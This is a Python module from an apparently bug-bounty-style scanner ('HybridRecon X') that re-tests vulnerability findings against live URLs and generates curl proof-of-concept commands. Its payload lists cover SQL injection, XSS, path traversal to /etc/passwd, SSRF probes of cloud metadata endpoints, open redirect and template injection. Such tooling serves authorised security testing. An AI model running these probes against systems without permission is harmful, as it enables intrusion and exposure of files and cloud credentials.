#!/usr/bin/env python3
import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
"""
============================================================================
MODULE 09: VALIDATION ENGINE
============================================================================
Re-confirms critical findings before final reporting.
Assigns confidence scores and generates PoC for confirmed vulnerabilities.

Confidence Levels:
- HIGH (90%+): Confirmed exploitable, PoC generated
- MEDIUM (60%): Multiple signals, likely vulnerable
- LOW (30%): Single detection, needs manual review
- INFO: Interesting but not exploitable
============================================================================
"""

import json
import os
import re
import sys
import time
import hashlib
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: requests library required. Install with: pip3 install requests")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress
    console = Console()
except ImportError:
    class Console:
        def print(self, *args, **kwargs): print(*args)
        def log(self, *args, **kwargs): print(*args)
    console = Console()


# ============================================================================
# DATA CLASSES
# ============================================================================
@dataclass
class Finding:
    """Represents a vulnerability finding."""
    url: str
    vuln_type: str
    payload: str = ""
    evidence: str = ""
    source: str = ""  # nuclei, dalfox, sqlmap, etc.
    severity: str = "medium"
    confidence: str = "LOW"
    confidence_score: float = 0.0
    validated: bool = False
    poc: str = ""
    validation_details: Dict = field(default_factory=dict)


@dataclass
class ValidationResult:
    """Result of validation attempt."""
    success: bool
    confidence_score: float
    evidence: str = ""
    poc: str = ""
    details: Dict = field(default_factory=dict)


# ============================================================================
# HTTP SESSION WITH RETRIES
# ============================================================================
def create_session() -> requests.Session:
    """Create a requests session with retry logic."""
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    return session


# ============================================================================
# SQLI VALIDATOR (DUAL-PROBE CAUSAL VERIFICATION)
# ============================================================================
class SQLiValidator:
    """Validates SQL injection findings using 3-way causal probes (Baseline vs Injected vs Control)."""
    
    # (inj_payload, ctrl_payload, delay_seconds)
    TIME_PAYLOADS = [
        ("' AND SLEEP(5)--", "' AND SLEEP(0)--", 5),
        ("' OR SLEEP(5)--", "' OR SLEEP(0)--", 5),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "1' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--", 5),
        ("'; WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:0'--", 5),
        ("' || pg_sleep(5)--", "' || pg_sleep(0)--", 5),
    ]
    
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"ORA-\d{5}",
        r"Oracle.*Driver",
        r"Microsoft.*ODBC.*SQL Server",
        r"SQLServer.*JDBC",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
        r"SQLite.*error",
        r"sqlite3.OperationalError",
    ]
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        """Validate SQLi with Baseline vs Injected vs Control causal checks."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # 1. Baseline Request R0
        try:
            t0_start = time.time()
            resp_baseline = self.session.get(url, timeout=12, verify=False)
            t0 = time.time() - t0_start
            baseline_text = resp_baseline.text
        except Exception:
            t0 = 1.0
            baseline_text = ""
        
        # 2. Causal Time-based Verification (R0 vs R_inj vs R_ctrl)
        for inj_payload, ctrl_payload, delay in self.TIME_PAYLOADS:
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    start_inj = time.time()
                    self.session.get(test_url, timeout=delay + 6, verify=False)
                    t_inj = time.time() - start_inj
                except requests.exceptions.Timeout:
                    t_inj = delay + 6
                except Exception:
                    continue
                
                # If injected probe took long enough, test control probe
                if t_inj >= delay - 0.8:
                    ctrl_params = params.copy()
                    ctrl_params[param] = [ctrl_payload]
                    ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                    try:
                        start_ctrl = time.time()
                        self.session.get(ctrl_url, timeout=delay + 2, verify=False)
                        t_ctrl = time.time() - start_ctrl
                    except Exception:
                        t_ctrl = t0
                    
                    # Causal condition: t_inj must significantly exceed both baseline t0 and control t_ctrl
                    if t_inj >= (t0 + delay - 1.2) and t_ctrl <= (t0 + 2.0) and (t_inj - t_ctrl) >= (delay - 1.5):
                        poc = f"curl -s '{test_url}' --max-time {delay + 5}"
                        return ValidationResult(
                            True, 0.98,
                            f"Time-based SQLi causally confirmed (T_baseline={t0:.1f}s, T_inj={t_inj:.1f}s, T_ctrl={t_ctrl:.1f}s)",
                            poc,
                            {"param": param, "payload": inj_payload, "t0": t0, "t_inj": t_inj, "t_ctrl": t_ctrl}
                        )
        
        # 3. Causal Error-based Verification (Ensure error is absent in R0 and R_ctrl)
        error_pairs = [
            ("'", "safe123"),
            ("\"", "safe123"),
            ("1' AND '1'='2", "1' AND '1'='1"),
        ]
        for inj_payload, ctrl_payload in error_pairs:
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False)
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, resp_inj.text, re.IGNORECASE):
                            # CAUSAL GATE: Check that baseline R0 does NOT already have this error
                            if baseline_text and re.search(pattern, baseline_text, re.IGNORECASE):
                                continue  # Pre-existing error on site, false positive
                            
                            # Check that control parameter does NOT produce this error
                            ctrl_params = params.copy()
                            ctrl_params[param] = [ctrl_payload]
                            ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                            resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False)
                            if not re.search(pattern, resp_ctrl.text, re.IGNORECASE):
                                poc = f"curl -s '{test_url}'"
                                return ValidationResult(
                                    True, 0.95,
                                    f"Error-based SQLi causally confirmed. Pattern: {pattern}",
                                    poc,
                                    {"param": param, "payload": inj_payload, "pattern": pattern}
                                )
                except Exception:
                    continue
        
        return ValidationResult(False, 0.2, "Could not causally confirm SQLi")


# ============================================================================
# XSS VALIDATOR (DUAL CANARY REFLECTION & BREAKOUT)
# ============================================================================
class XSSValidator:
    """Validates XSS findings using dual canary reflection and context breakout."""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.canary_a = "hx" + hashlib.md5(f"{time.time()}_a".encode()).hexdigest()[:8]
        self.canary_b = "hx" + hashlib.md5(f"{time.time()}_b".encode()).hexdigest()[:8]
    
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # 1. Baseline Request R0
        try:
            resp_baseline = self.session.get(url, timeout=10, verify=False)
            baseline_text = resp_baseline.text
        except Exception:
            baseline_text = ""
        
        if self.canary_a in baseline_text or self.canary_b in baseline_text:
            self.canary_a += "x1"
            self.canary_b += "x2"
        
        test_payloads = [
            (f"<{self.canary_a}>", f"<{self.canary_b}>", "tag_injection"),
            (f"'\"><{self.canary_a}>", f"'\"><{self.canary_b}>", "attribute_escape"),
            (f"<script>{self.canary_a}</script>", f"<script>{self.canary_b}</script>", "script_tag"),
            (f"\"-alert('{self.canary_a}')-\"", f"\"-alert('{self.canary_b}')-\"", "js_context"),
        ]
        
        for inj_payload, ctrl_payload, ctx_name in test_payloads:
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check if injected payload reflects unencoded
                    if inj_payload in resp_inj.text and inj_payload not in baseline_text:
                        # CAUSAL CHECK: Send control probe with canary_b
                        ctrl_params = params.copy()
                        ctrl_params[param] = [ctrl_payload]
                        ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                        resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False)
                        
                        # Injected canary A must NOT be in control response, but control canary B MUST be
                        if inj_payload not in resp_ctrl.text and ctrl_payload in resp_ctrl.text:
                            poc = f"curl -s '{test_url}'"
                            return ValidationResult(
                                True, 0.95,
                                f"Reflected XSS causally confirmed. Context: {ctx_name} (unescaped reflection verified)",
                                poc,
                                {"param": param, "payload": inj_payload, "context": ctx_name}
                            )
                except Exception:
                    continue
        
        return ValidationResult(False, 0.25, "Could not confirm unescaped XSS reflection")


# ============================================================================
# LFI VALIDATOR (CAUSAL FILE TRAVERSAL)
# ============================================================================
class LFIValidator:
    """Validates LFI findings with Baseline vs Injected vs Control traversal checks."""
    
    PAYLOADS = [
        ("../../../etc/passwd", "../../../etc/passwd_nonexistent_hybridx_chk", r"root:.*:0:0:"),
        ("....//....//....//etc/passwd", "....//....//....//etc/passwd_nonexistent_hybridx_chk", r"root:.*:0:0:"),
        ("..%2f..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd_nonexistent_hybridx_chk", r"root:.*:0:0:"),
        ("/etc/passwd", "/etc/passwd_nonexistent_hybridx_chk", r"root:.*:0:0:"),
        ("C:\\Windows\\win.ini", "C:\\Windows\\win_nonexistent_hybridx_chk.ini", r"\[extensions\]"),
        ("..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\win_nonexistent_hybridx_chk.ini", r"\[extensions\]"),
    ]
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        """Validate LFI by checking for file content and control reversion."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # 1. Baseline Request R0
        try:
            resp_baseline = self.session.get(url, timeout=10, verify=False)
            baseline_text = resp_baseline.text
        except Exception:
            baseline_text = ""
        
        for inj_payload, ctrl_payload, pattern in self.PAYLOADS:
            # Skip if pattern is already present in baseline (static documentation/tutorial)
            if baseline_text and re.search(pattern, baseline_text):
                continue
                
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False)
                    if re.search(pattern, resp_inj.text):
                        # CAUSAL CONTROL: Test nonexistent traversal
                        ctrl_params = params.copy()
                        ctrl_params[param] = [ctrl_payload]
                        ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                        resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False)
                        
                        if not re.search(pattern, resp_ctrl.text):
                            poc = f"curl -s '{test_url}'"
                            return ValidationResult(
                                True, 0.98,
                                f"LFI causally confirmed. Target file signature matched; control probe reverted.",
                                poc,
                                {"param": param, "payload": inj_payload, "pattern": pattern}
                            )
                except Exception:
                    continue
        
        return ValidationResult(False, 0.2, "Could not causally confirm LFI")


# ============================================================================
# SSRF VALIDATOR (CAUSAL METADATA ACCESS)
# ============================================================================
class SSRFValidator:
    """Validates SSRF findings with Baseline vs Injected vs Control checks."""
    
    METADATA_ENDPOINTS = [
        ("http://169.254.169.254/latest/meta-data/", "http://169.254.169.250/latest/meta-data/", r"ami-id|instance-id|hostname|local-ipv4"),
        ("http://metadata.google.internal/computeMetadata/v1/", "http://metadata.google.internal/computeMetadata/v9999/", r"attributes|project|instance"),
    ]
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        """Validate SSRF by testing internal endpoints against baseline and control."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        try:
            resp_baseline = self.session.get(url, timeout=10, verify=False)
            baseline_text = resp_baseline.text
        except Exception:
            baseline_text = ""
        
        for inj_payload, ctrl_payload, pattern in self.METADATA_ENDPOINTS:
            if baseline_text and re.search(pattern, baseline_text, re.IGNORECASE):
                continue
                
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False)
                    if re.search(pattern, resp_inj.text, re.IGNORECASE):
                        # Control probe
                        ctrl_params = params.copy()
                        ctrl_params[param] = [ctrl_payload]
                        ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                        resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False)
                        
                        if not re.search(pattern, resp_ctrl.text, re.IGNORECASE):
                            poc = f"curl -s '{test_url}'"
                            return ValidationResult(
                                True, 0.98,
                                "SSRF causally confirmed. Cloud metadata accessed and verified.",
                                poc,
                                {"param": param, "payload": inj_payload}
                            )
                except Exception:
                    continue
        
        return ValidationResult(False, 0.2, "Could not confirm SSRF")


# ============================================================================
# OPEN REDIRECT VALIDATOR (CAUSAL REDIRECT CONTROL)
# ============================================================================
class RedirectValidator:
    """Validates Open Redirect findings causally."""
    
    PAYLOAD_PAIRS = [
        ("https://example.com/hybridx_test", "https://hybridx-control-safe.local/test"),
        ("//example.com/hybridx_test", "//hybridx-control-safe.local/test"),
        ("/\\example.com/hybridx_test", "/\\hybridx-control-safe.local/test"),
    ]
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        """Validate Open Redirect by checking Location header causation."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        try:
            resp_baseline = self.session.get(url, timeout=10, verify=False, allow_redirects=False)
            baseline_loc = resp_baseline.headers.get('Location', '')
        except Exception:
            baseline_loc = ""
        
        for inj_payload, ctrl_payload in self.PAYLOAD_PAIRS:
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False, allow_redirects=False)
                    loc_inj = resp_inj.headers.get('Location', '')
                    
                    if 'example.com/hybridx_test' in loc_inj and loc_inj != baseline_loc:
                        # Control probe
                        ctrl_params = params.copy()
                        ctrl_params[param] = [ctrl_payload]
                        ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                        resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False, allow_redirects=False)
                        loc_ctrl = resp_ctrl.headers.get('Location', '')
                        
                        if 'hybridx-control-safe.local' in loc_ctrl:
                            poc = f"curl -sI '{test_url}' | grep -i location"
                            return ValidationResult(
                                True, 0.98,
                                f"Open Redirect causally confirmed. Redirect destination is fully controlled by parameter.",
                                poc,
                                {"param": param, "payload": inj_payload, "location": loc_inj}
                            )
                except Exception:
                    continue
        
        return ValidationResult(False, 0.25, "Could not confirm Open Redirect")


# ============================================================================
# SSTI VALIDATOR (MATHEMATICAL EVALUATION PROBE)
# ============================================================================
class SSTIValidator:
    """Validates Server-Side Template Injection using arithmetic canary differentiation."""
    
    ARITHMETIC_PROBES = [
        ("{{773*773}}", "597529", "{{773*772}}", "596756"),
        ("${{773*773}}", "597529", "${{773*772}}", "596756"),
        ("<%= 773*773 %>", "597529", "<%= 773*772 %>", "596756"),
        ("#{773*773}", "597529", "#{773*772}", "596756"),
        ("*{773*773}", "597529", "*{773*772}", "596756"),
    ]
    
    def __init__(self, session: requests.Session):
        self.session = session
        
    def validate(self, url: str, original_payload: str = "") -> ValidationResult:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return ValidationResult(False, 0.0, "No parameters to test")
            
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        try:
            resp_baseline = self.session.get(url, timeout=10, verify=False)
            baseline_text = resp_baseline.text
        except Exception:
            baseline_text = ""
            
        for inj_payload, inj_res, ctrl_payload, ctrl_res in self.ARITHMETIC_PROBES:
            if inj_res in baseline_text or ctrl_res in baseline_text:
                continue
                
            for param in params:
                test_params = params.copy()
                test_params[param] = [inj_payload]
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    resp_inj = self.session.get(test_url, timeout=10, verify=False)
                    if inj_res in resp_inj.text and inj_payload not in resp_inj.text:
                        # CAUSAL CHECK: Send control probe
                        ctrl_params = params.copy()
                        ctrl_params[param] = [ctrl_payload]
                        ctrl_url = f"{base_url}?{urllib.parse.urlencode(ctrl_params, doseq=True)}"
                        resp_ctrl = self.session.get(ctrl_url, timeout=10, verify=False)
                        
                        if ctrl_res in resp_ctrl.text and inj_res not in resp_ctrl.text:
                            poc = f"curl -s '{test_url}'"
                            return ValidationResult(
                                True, 0.99,
                                f"SSTI causally confirmed via arithmetic evaluation ({inj_payload} -> {inj_res}).",
                                poc,
                                {"param": param, "payload": inj_payload, "evaluated": inj_res}
                            )
                except Exception:
                    continue
                    
        return ValidationResult(False, 0.2, "Could not causally confirm SSTI")


# ============================================================================
# VALIDATION ENGINE
# ============================================================================
class ValidationEngine:
    """Main validation engine that coordinates all validators."""
    
    VALIDATORS = {
        'sqli': SQLiValidator,
        'sql': SQLiValidator,
        'sql-injection': SQLiValidator,
        'xss': XSSValidator,
        'cross-site-scripting': XSSValidator,
        'lfi': LFIValidator,
        'path-traversal': LFIValidator,
        'local-file-inclusion': LFIValidator,
        'ssrf': SSRFValidator,
        'server-side-request-forgery': SSRFValidator,
        'redirect': RedirectValidator,
        'open-redirect': RedirectValidator,
        'ssti': SSTIValidator,
        'template-injection': SSTIValidator,
    }
    
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.session = create_session()
        self.findings: List[Finding] = []
        self.validated_high: List[Finding] = []
        self.validated_medium: List[Finding] = []
        self.needs_review: List[Finding] = []
    
    def load_findings(self) -> int:
        """Load findings from vuln scan results."""
        vuln_dir = self.output_dir / 'vulns'
        
        # Load Nuclei results
        nuclei_files = list(vuln_dir.glob('*_results.json')) + list(vuln_dir.glob('*_results.txt'))
        for f in nuclei_files:
            self._parse_nuclei_results(f)
        
        # Load Dalfox results
        dalfox_file = vuln_dir / 'dalfox_results.txt'
        if dalfox_file.exists():
            self._parse_dalfox_results(dalfox_file)
        
        # Load exploit results
        exploit_dir = self.output_dir / 'exploits'
        for result_file in exploit_dir.glob('**/*.txt'):
            self._parse_generic_results(result_file)
        
        console.log(f"[cyan]Loaded {len(self.findings)} findings to validate[/cyan]")
        return len(self.findings)
    
    def _parse_nuclei_results(self, filepath: Path):
        """Parse Nuclei JSON/text results."""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    try:
                        data = json.loads(line.strip())
                        url = data.get('matched-at', data.get('host', ''))
                        template = data.get('template-id', '')
                        severity = data.get('info', {}).get('severity', 'medium')
                        
                        # Determine vuln type from template
                        vuln_type = self._classify_template(template)
                        
                        if url and vuln_type:
                            self.findings.append(Finding(
                                url=url,
                                vuln_type=vuln_type,
                                source='nuclei',
                                severity=severity,
                                payload=data.get('matched-line', ''),
                            ))
                    except json.JSONDecodeError:
                        continue
        except Exception:
            pass
    
    def _parse_dalfox_results(self, filepath: Path):
        """Parse Dalfox results."""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    if 'POC' in line or 'Vulnerable' in line:
                        # Extract URL from dalfox output
                        url_match = re.search(r'https?://[^\s]+', line)
                        if url_match:
                            self.findings.append(Finding(
                                url=url_match.group(),
                                vuln_type='xss',
                                source='dalfox',
                                severity='high',
                            ))
        except Exception:
            pass
    
    def _parse_generic_results(self, filepath: Path):
        """Parse generic vulnerability results."""
        try:
            with open(filepath, 'r') as f:
                content = f.read().lower()
                
                if 'sqli' in filepath.name or 'sql' in content:
                    vuln_type = 'sqli'
                elif 'xss' in filepath.name or 'xss' in content:
                    vuln_type = 'xss'
                elif 'lfi' in filepath.name or 'etc/passwd' in content:
                    vuln_type = 'lfi'
                elif 'ssrf' in filepath.name:
                    vuln_type = 'ssrf'
                elif 'ssti' in filepath.name or 'template' in content:
                    vuln_type = 'ssti'
                else:
                    return
            
            # Re-open file to read lines (fixes the EOF bug)
            with open(filepath, 'r') as f:
                for line in f:
                    url_match = re.search(r'https?://[^\s]+', line)
                    if url_match:
                        self.findings.append(Finding(
                            url=url_match.group(),
                            vuln_type=vuln_type,
                            source=filepath.stem,
                        ))
        except Exception:
            pass
    
    def _classify_template(self, template: str) -> str:
        """Classify Nuclei template to vulnerability type."""
        template_lower = template.lower()
        if any(x in template_lower for x in ['sqli', 'sql-injection', 'sql']):
            return 'sqli'
        elif any(x in template_lower for x in ['xss', 'cross-site']):
            return 'xss'
        elif any(x in template_lower for x in ['lfi', 'path-traversal', 'file-inclusion']):
            return 'lfi'
        elif any(x in template_lower for x in ['ssrf', 'server-side-request']):
            return 'ssrf'
        elif any(x in template_lower for x in ['redirect', 'open-redirect']):
            return 'redirect'
        elif any(x in template_lower for x in ['ssti', 'template-injection']):
            return 'ssti'
        return ''
    
    def validate_finding(self, finding: Finding) -> Finding:
        """Validate a single finding."""
        vuln_type = finding.vuln_type.lower()
        
        # Find appropriate validator
        validator_class = None
        for key, cls in self.VALIDATORS.items():
            if key in vuln_type:
                validator_class = cls
                break
        
        if not validator_class:
            finding.confidence = 'LOW'
            finding.confidence_score = 0.3
            return finding
        
        validator = validator_class(self.session)
        result = validator.validate(finding.url, finding.payload)
        
        finding.validated = result.success
        finding.confidence_score = result.confidence_score
        finding.evidence = result.evidence
        finding.poc = result.poc
        finding.validation_details = result.details
        
        if result.confidence_score >= 0.9:
            finding.confidence = 'HIGH'
        elif result.confidence_score >= 0.6:
            finding.confidence = 'MEDIUM'
        else:
            finding.confidence = 'LOW'
        
        return finding
    
    def validate_all(self, max_workers: int = 10):
        """Validate all loaded findings."""
        console.log(f"[cyan]Validating {len(self.findings)} findings...[/cyan]")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.validate_finding, f): f for f in self.findings}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    
                    if result.confidence == 'HIGH':
                        self.validated_high.append(result)
                        console.log(f"[green]✓ HIGH: {result.vuln_type} @ {result.url[:60]}...[/green]")
                    elif result.confidence == 'MEDIUM':
                        self.validated_medium.append(result)
                        console.log(f"[yellow]● MEDIUM: {result.vuln_type} @ {result.url[:60]}...[/yellow]")
                    else:
                        self.needs_review.append(result)
                except Exception as e:
                    console.log(f"[red]Validation error: {e}[/red]")
    
    def save_results(self):
        """Save validation results to files."""
        vuln_dir = self.output_dir / 'vulns'
        vuln_dir.mkdir(exist_ok=True)
        
        # Save high confidence
        with open(vuln_dir / 'validated_high.json', 'w') as f:
            json.dump([asdict(f) for f in self.validated_high], f, indent=2)
        
        # Save medium confidence
        with open(vuln_dir / 'validated_medium.json', 'w') as f:
            json.dump([asdict(f) for f in self.validated_medium], f, indent=2)
        
        # Save needs review
        with open(vuln_dir / 'needs_review.json', 'w') as f:
            json.dump([asdict(f) for f in self.needs_review], f, indent=2)
        
        console.log(f"[green]Results saved:[/green]")
        console.log(f"  HIGH confidence: {len(self.validated_high)}")
        console.log(f"  MEDIUM confidence: {len(self.validated_medium)}")
        console.log(f"  Needs review: {len(self.needs_review)}")
    
    def print_summary(self):
        """Print validation summary."""
        table = Table(title="Validation Summary")
        table.add_column("Confidence", style="cyan")
        table.add_column("Count", style="green")
        table.add_column("Action", style="yellow")
        
        table.add_row("HIGH", str(len(self.validated_high)), "Ready for report")
        table.add_row("MEDIUM", str(len(self.validated_medium)), "Likely valid")
        table.add_row("LOW", str(len(self.needs_review)), "Manual review needed")
        
        console.print(table)


# ============================================================================
# MAIN
# ============================================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='HybridRecon X - Validation Engine')
    parser.add_argument('--output', '-o', required=True, help='Output directory')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Validation threads')
    args = parser.parse_args()
    
    console.log("\n[bold magenta]═══ VALIDATION ENGINE ═══[/bold magenta]\n")
    
    engine = ValidationEngine(args.output)
    
    if engine.load_findings() == 0:
        console.log("[yellow]No findings to validate[/yellow]")
        return
    
    engine.validate_all(max_workers=args.threads)
    engine.save_results()
    engine.print_summary()
    
    console.log("\n[bold green]Validation complete![/bold green]\n")


if __name__ == '__main__':
    main()
